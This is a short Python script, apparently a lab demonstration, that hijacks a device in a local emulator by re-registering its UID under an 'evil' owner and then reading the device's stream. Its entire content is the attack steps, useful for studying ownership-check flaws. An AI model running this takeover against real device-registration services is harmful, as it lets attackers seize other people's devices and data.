#!/usr/bin/env python3
import requests, time
EMULATOR = "http://localhost:5000"
MAL_UID = "device001"
ATTACKER = "evil"

def re_register():
	print("Attacker re-registering UID...")
	r = requests.post(EMULATOR+"/register", json={"uid":MAL_UID, "owner":ATTACKER})
	print("attacker reg:", r.status_code, r.json())

def show_stream():
	r = requests.get(f"{EMULATOR}/stream/{MAL_UID}")
	print("stream after attack:", r.status_code, r.text.strip())
	
if __name__=="__main__":
	time.sleep(0.5)
	re_register()
	time.sleep(0.2)
	show_stream()
